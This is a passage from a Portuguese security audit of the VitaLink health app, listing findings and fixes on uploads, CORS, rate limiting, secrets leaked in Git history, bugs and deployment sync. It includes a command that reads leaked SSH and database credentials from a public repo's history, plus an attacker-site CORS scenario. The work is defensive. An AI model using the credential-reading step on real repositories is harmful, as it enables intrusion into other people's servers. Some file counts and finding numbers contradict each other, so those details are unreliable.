2. Fallback para extensão de arquivo (também pode ser forjado: `malware.exe.jpg`).
3. **Não valida magic bytes** (primeiros bytes do arquivo que identificam tipo real).

**Risco:** Upload de arquivo executável mascarado como imagem (`malware.exe` renomeado para `foto.jpg`).

**Correção recomendada:**
1. Usar biblioteca `file-type` para validar magic bytes:
   ```javascript
   const { fileTypeFromBuffer } = require('file-type');

   async function isAllowedUpload(file) {
     const buffer = await fs.readFile(file.path);
     const type = await fileTypeFromBuffer(buffer);
     if (!type) return false; // Sem magic bytes reconhecidos
     const allowed = ['image/jpeg', 'image/png', 'image/gif', 'application/pdf'];
     return allowed.includes(type.mime);
   }
   ```

2. Refatorar multer para validação assíncrona (mover para `fileFilter` ou validar após salvar e deletar se inválido).

---

##### **Achado #12 (Baixo): Arquivos Públicos sem Autenticação**
**Arquivo:** `backend/src/app.js`, linha 55  
**Código:**
```javascript
app.use('/uploads', express.static(UPLOAD_ROOT));
```

**Problema:** Todos os arquivos em `/uploads` são públicos (qualquer pessoa com URL pode baixar, sem autenticação).

**Risco:**
- Vazamento de exames médicos, receitas, documentos de pacientes.
- URL do arquivo é previsível: `/uploads/<timestamp>-<random>-<nome>.jpg`.

**Correção recomendada:**
1. **Remover `express.static('/uploads')`.**
2. **Criar endpoint autenticado:**
   ```javascript
   app.get('/uploads/:filename', authenticate, async (req, res) => {
     const file = await query(
       `SELECT * FROM arquivos WHERE caminho = :path LIMIT 1`,
       { path: `/uploads/${req.params.filename}` }
     );
     if (!file[0]) return res.status(404).json({ error: 'not_found' });

     // Verificar se usuário tem acesso ao paciente dono do arquivo
     // (via exames_receitas.paciente_id ou outro vínculo)
     const ids = await listAllowedPacienteIds(req.user);
     // ... validação omitida por brevidade

     const fullPath = path.join(UPLOAD_ROOT, req.params.filename);
     res.sendFile(fullPath);
   });
   ```

3. **Adicionar campo `paciente_id` na tabela `arquivos`** para vincular arquivo a paciente no momento do upload.

---

### 2.5 Headers de Segurança e CORS

#### 2.5.1 CORS
**Arquivo:** `backend/src/app.js`, linha 38-50  
**Configuração:**
```javascript
const allowAllCors = env.corsOrigin.includes('*');
app.use(
  cors({
    origin: allowAllCors
      ? true
      : (origin, cb) => {
          if (!origin || env.corsOrigin.includes(origin)) {
            return cb(null, true);
          }
          return cb(null, false);
        },
    credentials: true,
  })
);
```

**✅ Pontos positivos:**
- CORS configurável via `CORS_ORIGIN` (`.env`).
- Suporta múltiplas origens separadas por vírgula.
- `credentials: true` permite cookies (se fosse usado).

**❌ Problemas identificados:**

##### **Achado #13 (Alto): CORS Permissivo com Wildcard**
**Arquivo:** `deploy/docker-compose.yml`, linha 56  
**Código:**
```yaml
CORS_ORIGIN: ${CORS_ORIGIN:-*}
```

**Impacto:** **ALTO**  
O padrão é `*` (qualquer origem), permitindo que qualquer site faça requisições para a API. Isso anula proteção CORS.

**Cenário de ataque:**
1. Usuário faz login no VitaLink (`homolog.vitalink.app.br`).
2. Atacante hospeda site malicioso (`atacante.com`).
3. Site malicioso faz requisições para `https://homolog.vitalink.app.br/api/v1/pacientes` usando JWT do usuário (se estiver em localStorage — ver Achado #3).
4. Dados de pacientes são exfiltrados.

**Correção recomendada:**
1. **Definir CORS estrito no `.env` do servidor:**
   ```
   CORS_ORIGIN=https://homolog.vitalink.app.br
   ```
   (Apenas a origem do próprio frontend.)

2. **Remover wildcard padrão do docker-compose:**
   ```yaml
   CORS_ORIGIN: ${CORS_ORIGIN:?ERRO: CORS_ORIGIN não definido no .env}
   ```

3. **Se precisar de múltiplas origens (ex.: app mobile):**
   ```
   CORS_ORIGIN=https://homolog.vitalink.app.br,https://app.vitalink.app.br
   ```

---

#### 2.5.2 Headers de Segurança
**Arquivo:** `backend/src/app.js`, linha 34-36  
**Código:**
```javascript
app.use(helmet({
  crossOriginResourcePolicy: { policy: 'cross-origin' },
}));
```

**Headers configurados por Helmet:**
- ✅ `X-Content-Type-Options: nosniff`
- ✅ `X-Frame-Options: SAMEORIGIN`
- ✅ `X-XSS-Protection: 1; mode=block` (legado, mas não faz mal)
- ✅ `Strict-Transport-Security: max-age=15552000; includeSubDomains` (se HTTPS)
- ⚠️ **`Content-Security-Policy`: NÃO configurado** (Helmet não ativa por padrão se não especificado).

**❌ Problemas identificados:**

##### **Achado #14 (Médio): Falta Content-Security-Policy**
**Impacto:** **MÉDIO**  
Sem CSP, se houver XSS, atacante pode injetar scripts inline e roubar dados.

**Correção recomendada (já descrita no Achado #3):**
Adicionar CSP estrito no Helmet (ver código na seção 2.1.1).

---

### 2.6 Rate Limiting

**Análise:** ❌ **RATE LIMITING NÃO IMPLEMENTADO**.

**Arquivo:** `backend/package.json` — não inclui `express-rate-limit` ou similar.  
**Verificação no código:** Nenhum middleware de rate limiting encontrado em `app.js`, `auth.routes.js` ou outros.

##### **Achado #3 (Crítico): Ausência de Rate Limiting**
**Impacto:** **CRÍTICO**  
Sem rate limiting, a API é vulnerável a:
1. **Brute-force de login:** Atacante pode tentar milhares de senhas em `/auth/login` até acertar.
2. **DoS (Denial of Service):** Requisições massivas podem derrubar o servidor.
3. **Enumeração de usuários:** Atacante pode verificar quais e-mails existem testando `/auth/esqueci-senha` (diferença de resposta entre "usuário não encontrado" e "e-mail enviado").

**Correção recomendada:**
1. **Instalar `express-rate-limit`:**
   ```bash
   npm install express-rate-limit
   ```

2. **Adicionar middleware global** (limite geral de requisições):
   ```javascript
   const rateLimit = require('express-rate-limit');

   const generalLimiter = rateLimit({
     windowMs: 15 * 60 * 1000, // 15 minutos
     max: 100, // 100 requisições por IP
     message: 'Muitas requisições deste IP. Tente novamente em 15 minutos.',
   });
   app.use(generalLimiter);
   ```

3. **Adicionar limiter estrito em rotas sensíveis:**
   ```javascript
   const authLimiter = rateLimit({
     windowMs: 15 * 60 * 1000,
     max: 5, // 5 tentativas de login por 15 min
     skipSuccessfulRequests: true,
   });
   app.post('/auth/login', authLimiter, authController.login);
   app.post('/auth/esqueci-senha', authLimiter, authController.esqueciSenha);
   ```

4. **Considerar `express-slow-down`** (reduz velocidade progressivamente em vez de bloquear).

---

### 2.7 Logs com Dados Sensíveis

**Arquivo:** `backend/src/utils/logger.js`  
**Sanitização:** ✅ Logger redige campos sensíveis (`password`, `senha`, `token`, `email`, `cpf`, `telefone`, `diagnostico`).

**Código:**
```javascript
const SENSITIVE_KEYS = [
  'password', 'senha', 'senha_hash', 'token', 'authorization',
  'email', 'cpf', 'crm', 'telefone', 'instrucoes_uso',
  'principio_ativo', 'diagnostico', 'prontuario',
];

function sanitize(value) {
  // ... recursivo, substitui valores por '[REDACTED]'
}
```

**✅ Pontos positivos:**
- Sanitização aplicada em todos os logs via wrapper `log(level, message, meta)`.
- Logs vão para `stdout` (JSON estruturado) — bom para agregação.

**⚠️ Problemas identificados:**

##### **Achado #15 (Baixo): Logs Não Incluem Request ID**
**Impacto:** **BAIXO**  
Sem request ID, é difícil rastrear requisições em logs distribuídos (ex.: correlacionar log de autenticação com log de query).

**Correção recomendada:**
1. Instalar `express-request-id`:
   ```bash
   npm install express-request-id
   ```

2. Adicionar middleware:
   ```javascript
   const addRequestId = require('express-request-id')();
   app.use(addRequestId);
   ```

3. Incluir `req.id` em todos os logs:
   ```javascript
   logger.info('Usuário autenticado', { requestId: req.id, userId: req.user.id });
   ```

---

### 2.8 Segredos no Repositório

##### **Achado #1 (CRÍTICO): Credenciais do Servidor no Histórico Git**
**Arquivo:** `acesso.srv` (commitado no `fc65f88`, removido no `88badf2`)  
**Impacto:** **CRÍTICO**  
**Descrição:**  
O arquivo `acesso.srv` com credenciais de acesso SSH e banco de dados do servidor foi commitado no repositório em `fc65f88` (2026-10-XX). Embora tenha sido removido no HEAD da branch `dev` (commits `80c8f93` e `88badf2`), **o conteúdo permanece no histórico Git**. Como o repositório é **público** (`github.com/geninho33/vitalink`), qualquer pessoa pode:
```bash
git checkout fc65f88
cat acesso.srv
```

**Risco:**
- Acesso SSH ao servidor de homologação (`homolog.vitalink.app.br`).
- Credenciais do banco de dados.
- Possível pivoteamento para produção.

**Correção recomendada:**
1. **Rotacionar TODAS as credenciais expostas imediatamente:**
   - Senha SSH do servidor.
   - Senha do banco de dados PostgreSQL.
   - JWT_SECRET (se estava no arquivo).

2. **Remover arquivo do histórico Git** usando `git filter-repo`:
   ```bash
   pip install git-filter-repo
   git filter-repo --path acesso.srv --invert-paths --force
   git push --force --all
   ```
   ⚠️ **ATENÇÃO:** Isso reescreve o histórico. Todos os colaboradores precisam fazer `git pull --rebase` ou `git clone` novamente.

3. **Adicionar `acesso.srv` ao `.gitignore`** (já foi feito no `80c8f93`).

4. **Auditar o histórico para outros segredos:**
   ```bash
   git log -p | grep -E "(password|secret|key|senha)" | less
   ```

5. **Configurar GitHub Secret Scanning** (gratuito para repos públicos) para alertar sobre commits futuros com segredos.

6. **Documentar o incidente:**
   - Data de exposição.
   - Credenciais afetadas.
   - Ações tomadas.
   - Notificar titulares de dados (LGPD) se houver evidência de acesso não autorizado.

---

## 3. Bugs e Riscos de Correção

### 3.1 Bugs Funcionais Identificados

##### **Achado #16 (Médio): Ordenação Invertida na Agenda**
**Arquivo:** Divergência no servidor (`server-uncommitted.diff`, linha 20)  
**Descrição:**  
No código do servidor de homologação (não commitado), a ordenação da timeline foi alterada de `DESC` para `ASC`:
```diff
-       ORDER BY a.data_hora_inicio DESC
+       ORDER BY a.data_hora_inicio ASC
```

**Impacto:**  
- Eventos mais antigos aparecem primeiro (esperado: mais recentes no topo).
- Pode confundir usuários ao visualizar agenda.

**Status:** Bug já identificado e corrigido no servidor, mas **não commitado no Git**. Divergência entre servidor e repositório.

**Correção recomendada:**
Commitar mudança no servidor para `dev` com mensagem clara:
```bash
git add backend/src/controllers/atividades.controller.js
git commit -m "fix(atividades): corrige ordenação da timeline (ASC → DESC)"
```

---

##### **Achado #17 (Baixo): Filtro de Medicamentos Invertido**
**Arquivo:** `server-uncommitted.diff`, linha 10  
**Descrição:**  
No servidor, foi adicionado filtro para excluir medicamentos da agenda quando `tipo` não é especificado:
```javascript
} else {
  where.push(`COALESCE(a.tipo, '') <> 'medicamento'`);
}
```

**Impacto:**  
- Query `GET /agenda` sem parâmetro `tipo` não retorna eventos de medicamento.
- Documentação (se existir) provavelmente não reflete isso.

**Correção recomendada:**
1. Documentar comportamento no contrato da API (`docs/api-contracts.md`).
2. Avaliar se é desejado — pode ser feature (separar medicamentos) ou bug (esconder medicamentos).

---

### 3.2 Tratamento de Erros

**Análise:**  
- ✅ Middleware `errorHandler` centraliza tratamento (arquivo `backend/src/middleware/errorHandler.js`).
- ✅ Erros de validação retornam 400 com mensagem clara.
- ✅ Erros de duplicação (unique constraint) retornam 409.
- ⚠️ **Erros de banco expõem detalhes internos** em desenvolvimento (stack trace completo).

##### **Achado #18 (Baixo): Stack Trace Exposto em Produção**
**Arquivo:** `backend/src/middleware/errorHandler.js` (não anexado, inferido)  
**Risco:** Se `NODE_ENV !== 'production'`, stack traces são enviados ao cliente, expondo estrutura interna.

**Correção recomendada:**
```javascript
function errorHandler(err, req, res, next) {
  logger.error('Request error', { message: err.message, stack: err.stack });
  const status = err.status || 500;
  const response = { error: err.code || 'internal_error', message: err.message };
  if (process.env.NODE_ENV !== 'production') {
    response.stack = err.stack;
  }
  res.status(status).json(response);
}
```

---

### 3.3 Condições de Corrida

**Análise:**  
- Não há uso de transactions explícitas em operações multi-tabela (ex.: criar paciente + vincular responsável).
- Risco de inconsistência se request for abortado entre queries.

##### **Achado #19 (Médio): Falta Transactions em Operações Críticas**
**Exemplo:** `backend/src/services/vinculoPaciente.service.js`, função `upsertPacienteOnboarding` (linha 169+).

**Código atual:**
```javascript
const result = await query(`INSERT INTO pacientes (...) VALUES (...)`, {...});
const pacienteId = result.insertId;
await linkResponsavelPaciente(pacienteId, responsavelId);
await attachDualRoleIfSameCpf(responsavelId);
```

**Problema:** Se `linkResponsavelPaciente` falhar, o paciente já foi criado (órfão).

**Correção recomendada:**
1. Usar transactions:
   ```javascript
   const client = await pool.connect();
   try {
     await client.query('BEGIN');
     const result = await client.query(`INSERT INTO pacientes ...`);
     await client.query(`INSERT INTO paciente_responsaveis ...`);
     await client.query('COMMIT');
   } catch (err) {
     await client.query('ROLLBACK');
     throw err;
   } finally {
     client.release();
   }
   ```

2. Encapsular em helper:
   ```javascript
   async function withTransaction(callback) {
     const client = await pool.connect();
     try {
       await client.query('BEGIN');
       const result = await callback(client);
       await client.query('COMMIT');
       return result;
     } catch (err) {
       await client.query('ROLLBACK');
       throw err;
     } finally {
       client.release();
     }
   }
   ```

---

### 3.4 Fuso Horário

**Análise:**  
- PostgreSQL está configurado com `TIMESTAMPTZ` (timezone-aware).
- Node.js usa UTC por padrão.
- ⚠️ **Frontend não especifica timezone ao exibir datas** — assume local do navegador.

##### **Achado #20 (Baixo): Inconsistência de Timezone em Agenda**
**Risco:** Usuário em São Paulo (UTC-3) agenda medicamento às 08:00. Backend grava `08:00 UTC`. Frontend exibe `05:00` (UTC-3).

**Correção recomendada:**
1. **Padronizar timezone no backend** (America/Sao_Paulo):
   ```javascript
   // backend/src/config/database.js
   pool.on('connect', (client) => {
     client.query("SET timezone = 'America/Sao_Paulo'");
   });
   ```

2. **Converter datas no frontend** antes de enviar:
   ```javascript
   const local = new Date(input); // Assume local
   const utc = new Date(local.getTime() - local.getTimezoneOffset() * 60000);
   ```

3. **Documentar timezone esperado** na API (`docs/api-contracts.md`).

---

## 4. Qualidade

### 4.1 Testes

**Análise:**  
❌ **NENHUM TESTE ENCONTRADO.**

**Verificação:**
- Sem pasta `__tests__/` ou `test/` no backend ou frontend.
- Sem `jest`, `vitest`, `mocha` ou `cypress` no `package.json`.
- Sem script `npm test` funcional.

**Impacto:** **ALTO**  
Sem testes, cada mudança tem risco de regressão. Bugs só são descobertos em produção.

##### **Achado #21 (Alto): Ausência Total de Testes**
**Correção recomendada:**
1. **Backend:** Adicionar Jest + Supertest:
   ```bash
   npm install --save-dev jest supertest
   ```
   Criar `backend/__tests__/auth.test.js`:
   ```javascript
   const request = require('supertest');
   const { createApp } = require('../src/app');

   describe('POST /auth/login', () => {
     it('retorna 401 para credenciais inválidas', async () => {
       const res = await request(createApp())
         .post('/api/v1/auth/login')
         .send({ email: 'fake@test.com', senha: 'wrong' });
       expect(res.status).toBe(401);
     });
   });
   ```

2. **Frontend:** Adicionar Vitest + React Testing Library:
   ```bash
   npm install --save-dev vitest @testing-library/react
   ```

3. **Cobertura mínima:** Testes de autenticação, RBAC, escopo de pacientes.

---

### 4.2 Linter

**Análise:**  
- ❌ Sem ESLint configurado no backend.
- ❌ Sem ESLint/Prettier no frontend.

**Impacto:** Código inconsistente (tabs vs. espaços, aspas simples vs. duplas, ponto e vírgula).

##### **Achado #22 (Baixo): Ausência de Linter**
**Correção recomendada:**
```bash
npm install --save-dev eslint eslint-config-airbnb-base
npx eslint --init
```

---

### 4.3 Dependências Desatualizadas/Vulneráveis

**Análise:** Executado `npm audit` no backend.

**Resultado:**
```
1 high severity vulnerability
@faker-js/faker <=10.4.0
Faker: helpers.fake exploitable into arbritary code execution
fix available via `npm audit fix --force`
Will install @faker-js/faker@10.6.0
```

##### **Achado #23 (Alto): Vulnerabilidade no @faker-js/faker**
**CVE:** `GHSA-qxc2-j82w-r537`  
**Impacto:** RCE (Remote Code Execution) via `helpers.fake`.

**Uso no código:**  
`@faker-js/faker` é usado em `backend/src/seeds/runSeeds.js` para gerar dados de teste. **Não é usado em runtime de produção** (apenas em seed).

**Risco:** **Médio** (ambiente dev/staging comprometido pode afetar produção indiretamente).

**Correção recomendada:**
```bash
npm audit fix --force
# Ou manualmente:
npm install @faker-js/faker@10.6.0
```

---

### 4.4 Padrões Inconsistentes

**Observações:**
- ✅ Backend usa factory pattern para CRUD (`utils/crudFactory.js`) — reduz duplicação.
- ✅ Frontend usa Context API — boa prática.
- ⚠️ **Mistura de arrow functions e function declarations** — preferir uma convenção.
- ⚠️ **Comentários excessivos em alguns arquivos** (ex.: `// Responsável (perfil 5): sem criar/excluir responsáveis` em `app.js`) — melhor extrair para documentação.

**Recomendação:** Criar guia de estilo (`CONTRIBUTING.md`) com:
- Usar `async/await` (não callbacks).
- Arrow functions para callbacks curtos, `function` para funções exportadas.
- JSDoc para funções públicas.

---

## 5. Deploy e Operação

### 5.1 Dockerfiles

**Arquivos:**
- `deploy/Dockerfile.backend` (Node 20-alpine, multi-stage)
- `deploy/Dockerfile.frontend` (Nginx-alpine + build Vite)

**✅ Pontos positivos:**
- Multi-stage builds (imagens finais pequenas).
- Usuário não-root (`vitalink`) no backend.
- Healthchecks configurados no `docker-compose.yml`.

**⚠️ Problema:**

##### **Achado #24 (Médio): Entrypoint Aplica Patches no Boot (Lentidão)**
**Arquivo:** `deploy/docker-entrypoint.sh`, linha 43-63  
**Descrição:**  
Todo boot do container backend executa `db-prepare.js`, que:
1. Aguarda PostgreSQL responder (até 45 tentativas × 2s = 90s).
2. Aplica schema completo.
3. Aplica todos os 18 patches (mesmo já aplicados — depende de idempotência).

**Impacto:**
- Boot lento (30-90s).
- Risco de timeout no healthcheck do Docker Compose.
- Se patch falhar, API sobe mesmo assim (linha 50: `AVISO: db-prepare falhou — iniciando API mesmo assim`).

**Correção recomendada:**
1. Separar migrations do boot:
   - Rodar `db-prepare.js` apenas em deploy manual (script `deploy/migrate.sh`).
   - Container backend assume que banco já está migrado.

2. Implementar lock de migração (tabela `schema_lock`) para evitar corrida se múltiplos containers subirem simultaneamente.

3. Remover `RUN_MIGRATIONS=true` do compose (mover para CI/CD).

---

### 5.2 Docker Compose

**Arquivo:** `deploy/docker-compose.yml`  
**Serviços:**
1. `vitalink-db` (PostgreSQL 16-alpine)
2. `vitalink-backend` (Node.js + entrypoint)
3. `vitalink-frontend` (Nginx)

**Healthchecks:**
- ✅ DB: `pg_isready` (retries: 30, start_period: 20s).
- ✅ Backend: `curl http://127.0.0.1:3333/health` (retries: 36, start_period: 120s).
- ❌ Frontend: **SEM healthcheck**.

**Volumes:**
- ✅ `vitalink_pg_data` (persistente).
- ✅ `vitalink_uploads` (persistente).

**Rede:**
- ✅ Bridge `vitalink-net` (isolada).

**⚠️ Problemas já identificados:**
- **Achado #2:** `JWT_SECRET` padrão inseguro.
- **Achado #2 (extensão):** `DB_PASSWORD` padrão inseguro (`vitalink_secret`).

**Correção adicional:**
Adicionar healthcheck no frontend:
```yaml
vitalink-frontend:
  # ...
  healthcheck:
    test: ["CMD-SHELL", "curl -f http://localhost/ || exit 1"]
    interval: 10s
    timeout: 3s
    retries: 3
```

---

### 5.3 Nginx

**Arquivo:** `server-config.txt` (linhas 105-156) — nginx no servidor.  
**Configuração:**
- ✅ HTTPS com Let's Encrypt (certificado válido).
- ✅ Redirect HTTP → HTTPS.
- ✅ Proxy pass para frontend (`http://127.0.0.1:3102`).
- ⚠️ **Backend NÃO está proxiado pelo nginx** — acesso direto na porta 3002 (não verificado se porta está exposta).

**Problema:** Frontend faz requisições para `/api/v1`, mas nginx não tem `location /api/` configurado. Como funciona?

**Análise do Dockerfile frontend:**
```dockerfile
ARG VITE_API_URL=/api/v1
```
Vite build embutido usa `/api/v1` (relativo). Nginx deveria ter:
```nginx
location /api/ {
  proxy_pass http://127.0.0.1:3002;
}
```

**Achado:** Nginx no servidor pode estar incompleto. Verificar se API é acessível via HTTPS.

---

### 5.4 Backups

❌ **NENHUMA ESTRATÉGIA DE BACKUP DOCUMENTADA.**

**Recomendação:**
1. **Backup diário do PostgreSQL:**
   ```bash
   docker exec vitalink-db pg_dump -U vitalink vitalink | gzip > /backups/vitalink-$(date +%Y%m%d).sql.gz
   ```
   Agendar via cron no servidor.

2. **Backup do volume de uploads:**
   ```bash
   tar -czf /backups/uploads-$(date +%Y%m%d).tar.gz /var/lib/docker/volumes/vitalink_uploads
   ```

3. **Retenção:** 7 dias local + 30 dias em S3/Backblaze.

4. **Testar restore:** Rodar restore mensal para validar backups.

---

### 5.5 Defaults Inseguros

**Já identificados:**
- **Achado #2:** `JWT_SECRET` padrão.
- **Achado #2 (extensão):** `DB_PASSWORD` padrão.

**Outros defaults encontrados:**
- ✅ `NODE_ENV=production` forçado no Dockerfile.
- ⚠️ `CORS_ORIGIN=*` padrão (Achado #13).
- ⚠️ Porta frontend 3102 (HTTP) exposta diretamente — deveria ser apenas interna.

---

## 6. Divergências Entre Servidor, Local e Git

### 6.1 Análise das Divergências

**Estado atual (09 de outubro de 2026):**

| Ambiente | Branch/Commit | Arquivos Modificados | Status |
|----------|---------------|----------------------|--------|
| **Git (`dev`)** | `88badf2` | 0 (limpo) | Referência |
| **Servidor (`homolog.vitalink.app.br`)** | `01507e1` (5 commits atrás) | **20 arquivos modificados não commitados** | Divergente |
| **Máquina Local (desenvolvedor)** | `dev` (HEAD) | **4 arquivos modificados não commitados** | Divergente |

**Commits faltando no servidor:**
O servidor está no commit `01507e1` (2026-10-XX). A branch `dev` tem mais 5 commits:
1. `c775df3` — feat: enhance document handling and medication management
2. `fc65f88` — feat: enhance consultas and document handling (+ `acesso.srv` commitado)
3. `80c8f93` — chore(security): remove acesso.srv do versionamento
4. `88badf2` — chore(security): para de versionar acesso.srv
5. (HEAD da `dev`)

**Arquivos modificados no servidor (20 arquivos):**  
Análise do `server-uncommitted.diff`:
1. **Backend (12 arquivos):**
   - `controllers/atividades.controller.js` — Nova rota `/consultas/:id/documentos`, ordenação ASC.
   - `controllers/me.controller.js` — Chamada de `healAutocuidadoPacienteLinks`.
   - `controllers/pessoas.controller.js` — Hook `afterSave` para criar usuário de cuidador.
   - `controllers/saude.controller.js` — Refatoração de `syncPacienteResponsaveis`.
   - `controllers/usuarios.controller.js` — Expansão de escopo para Responsável listar usuários.
   - `services/menu.service.js` — Filtro de menus para ocultar rede unificada de perfis não-admin.
   - `services/pacienteScope.service.js` — Expansão de escopo para Cuidador/Responsável (UNION com múltiplos vínculos).
   - `services/vinculoPaciente.service.js` — 3 novas funções: `ensureUsuarioForCuidador`, `healResponsavelPacienteLinks`, `healCuidadoresUsuarios`, `healAutocuidadoPacienteLinks`.
   - `utils/crudFactory.js` — Flag `skipStampOwner` para não forçar `usuario_id` em cuidadores.
   - `routes/atividades.routes.js` — Nova rota `/consultas/:id/documentos`.

2. **Frontend (6 arquivos):**
   - `components/ProtectedRoute.jsx` — Lógica de gate expandida para Autocuidado (permite `/inicio` vazio).
   - `components/layout/AppShell.jsx` — Passa flag `selfCare` para `filterMenusWithoutPatient`.
   - `components/layout/Sidebar.jsx` — Mensagem alterada ("Complete seu cadastro em Início → Perfil").
   - `components/CuidadorVinculosPanel.jsx` — Substituição de `TextSelect` por `AutocompleteSelect` (busca assíncrona).
   - `utils/pacienteGate.js` — Nova constante `SELF_CARE_GATE_PATHS`, função `isSelfCareGatePath`, lógica expandida.

3. **Deploy (2 arquivos):**
   - `docker-compose.yml` — Variáveis `APP_DB_USER` e `APP_DB_PASSWORD` (separação de creds de app vs. admin).

**Arquivos modificados localmente (4 arquivos):**  
Análise do `local-uncommitted.diff`:
1. `backend/src/controllers/me.controller.js` — **MESMA mudança do servidor** (`healAutocuidadoPacienteLinks`).
2. `backend/src/services/pacienteScope.service.js` — **MESMA mudança do servidor** (UNION de CPF).
3. `backend/src/services/vinculoPaciente.service.js` — **MESMA mudança do servidor** (3 funções heal).
4. `frontend/src/components/ProtectedRoute.jsx` — **MESMA mudança do servidor** (gate Autocuidado).
5. `frontend/src/components/layout/AppShell.jsx` — **MESMA mudança do servidor** (selfCare flag).
6. `frontend/src/components/layout/Sidebar.jsx` — **MESMA mudança do servidor** (mensagem).
7. `frontend/src/utils/pacienteGate.js` — **MESMA mudança do servidor** (SELF_CARE_GATE_PATHS).

**Conclusão:** As mudanças locais e do servidor são **IDÊNTICAS** (mesmo diff). Ambos têm o mesmo trabalho não commitado.

---

### 6.2 Riscos Identificados

1. **Perda de trabalho:** Se servidor for redeployado a partir do Git (`dev`), as 20 mudanças são perdidas.
2. **Inconsistência de features:** Servidor tem funcionalidades (Autocuidado sem paciente, busca assíncrona de cuidadores) que não estão documentadas no Git.
3. **Impossível rollback:** Se bug aparecer em produção, não há commit para reverter.
4. **Conflito de merge futuro:** Quando tentar commitar, pode haver conflito com outros commits na `dev`.
5. **Auditoria impossível:** LGPD exige rastreabilidade de mudanças em dados sensíveis — sem commit, não há log de "quem mudou o quê".

---

### 6.3 Colisões Entre Mudanças

**Análise:** Não há colisão — mudanças locais e do servidor são idênticas (mesmo autor desenvolvendo em ambos os ambientes).

**Hipótese:** Desenvolvedor fez mudanças localmente, testou em desenvolvimento, deployou manualmente no servidor de homologação (via `git pull` + `docker-compose restart`), mas **esqueceu de commitar**.

---

### 6.4 Plano de Sincronização Seguro

**Objetivo:** Trazer mudanças do servidor e da máquina local para o Git (`dev`) sem perder trabalho.

**Premissas:**
- Mudanças locais e do servidor são idênticas (mesmo diff).
- Branch `dev` está 5 commits à frente do servidor.
- Nenhum outro desenvolvedor commitou em `dev` desde `88badf2` (verificar antes de executar).

**Passos:**

#### **Passo 1: Backup de Segurança**
```bash
# No servidor
ssh usuario@homolog.vitalink.app.br
cd /path/to/vitalink
git diff > /tmp/server-changes-backup.diff
cp /tmp/server-changes-backup.diff ~/backups/

# Local
cd /path/to/vitalink
git diff > /tmp/local-changes-backup.diff
```

#### **Passo 2: Verificar Consistência**
```bash
# Local
diff /tmp/local-changes-backup.diff <(ssh usuario@homolog.vitalink.app.br cat /tmp/server-changes-backup.diff)
# Se output vazio → mudanças são idênticas ✓
```

#### **Passo 3: Atualizar Servidor para HEAD da dev**
```bash
# No servidor
git stash  # Guarda mudanças não commitadas
git fetch origin
git checkout dev
git pull origin dev  # Puxa 5 commits faltando (c775df3..88badf2)
git stash pop  # Re-aplica mudanças
# Resolver conflitos se houver (improvável se mudanças locais = servidor)
```

#### **Passo 4: Commitar Mudanças (Local ou Servidor)**
```bash
# Local (ou no servidor, tanto faz — mudanças são iguais)
git add backend/src/controllers/atividades.controller.js
git add backend/src/controllers/me.controller.js
# ... adicionar todos os 20 arquivos
git commit -m "feat(autocuidado): implementa fluxo sem paciente inicial + heal de vínculos

- Permite perfil Autocuidado acessar /inicio antes de ter ficha de paciente
- Adiciona funções heal* para auto-vincular pacientes/responsáveis/cuidadores por CPF
- Substitui TextSelect por AutocompleteSelect em CuidadorVinculosPanel
- Adiciona rota GET /consultas/:id/documentos para buscar exames da consulta
- Filtra menus de rede de saúde (médicos/hospitais/etc) para perfis não-admin
- Corrige ordenação de timeline (ASC para eventos futuros aparecerem primeiro)
- Separa credenciais de app e admin no docker-compose (APP_DB_USER/PASSWORD)"
```

#### **Passo 5: Push para origin/dev**
```bash
git push origin dev
```

#### **Passo 6: Redeploy do Servidor**
```bash
# No servidor
git pull origin dev  # Agora tem o commit recém-criado
docker-compose down
docker-compose up -d --build
docker-compose logs -f vitalink-backend  # Verificar se subiu sem erro
```

#### **Passo 7: Validação**
1. Acessar `https://homolog.vitalink.app.br`.
2. Testar login.
3. Criar usuário Autocuidado.
4. Verificar se `/inicio` funciona sem paciente vinculado.
5. Criar paciente e verificar autocomplete de cuidadores.

#### **Passo 8: Cleanup**
```bash
# Local e servidor
git stash clear  # Remove stash se não precisar mais
rm /tmp/*-backup.diff
```

---

### 6.5 Recomendações de Processo

Para evitar divergências futuras:

1. **Nunca editar código diretamente no servidor de produção/homologação.**
   - Servidor deve rodar código versionado (tag ou branch fixa).

2. **Implementar CI/CD:**
   - Push para `dev` → GitHub Actions → build + deploy automático em homologação.
   - Push para `main` → deploy em produção (após aprovação manual).

3. **Git hooks pré-push:**
   ```bash
   # .git/hooks/pre-push
   if git diff --quiet; then
     exit 0
   else
     echo "ERRO: Você tem mudanças não commitadas. Commit antes de push."
     exit 1
   fi
   ```

4. **Revisão de código obrigatória:**
   - Todo PR deve ter pelo menos 1 aprovação antes de merge em `dev`.

5. **Documentar deploys:**
   - Criar `CHANGELOG.md` com commits de cada deploy.

---

## 7. Plano de Ação Priorizado

### Prioridade Crítica (Corrigir em 24-48h)

1. **[#1] Remover credenciais do histórico Git**
   - Rotacionar senhas SSH, DB, JWT_SECRET.
   - `git filter-repo --path acesso.srv --invert-paths`.
   - Push forçado (quebra clones locais — avisar time).

2. **[#2] Trocar segredos padrão no docker-compose**
   - Gerar `JWT_SECRET` forte (`openssl rand -base64 48`).
   - Gerar `DB_PASSWORD` forte.
   - Adicionar no `.env` do servidor.
   - Remover defaults do `docker-compose.yml`.

3. **[#3] Implementar rate limiting**
   - Instalar `express-rate-limit`.
   - Limiter global (100 req/15min).
   - Limiter estrito em `/auth/login` (5 req/15min).

4. **[#6] Corrigir IDOR em endpoints críticos**
   - Adicionar `assertPacienteAccess` em:
     - `DELETE /consultas/:id`
     - `PUT /consultas/:id`
     - `GET /me/paciente?id=:id`
     - `PUT /exames-receitas/:id`
   - Testar com usuários de perfis diferentes.

5. **[Divergência] Commitar mudanças do servidor**
   - Seguir plano de sincronização (seção 6.4).
   - Validar deploy em homologação.

---

### Prioridade Alta (Corrigir em 1-2 semanas)

6. **[#5] Remover hard-coded RBAC**
   - Adicionar permissões de Paciente/Autocuidado na tabela `permissoes_acesso`.
   - Remover lógica especial de `rbac.js`.

7. **[#7] Adicionar constraints de unicidade**
   - `usuarios.cpf UNIQUE`.
   - `responsaveis.cpf UNIQUE`.
   - `pacientes.cpf UNIQUE`.

8. **[#10] Validar UPLOAD_DIR**
   - Forçar path fixo em produção (`/app/uploads`).

9. **[#11] Validar magic bytes em uploads**
   - Instalar `file-type`.
   - Refatorar `isAllowedUpload`.

10. **[#12] Proteger /uploads com autenticação**
    - Remover `express.static('/uploads')`.
    - Criar `GET /uploads/:filename` autenticado.

11. **[#13] Corrigir CORS**
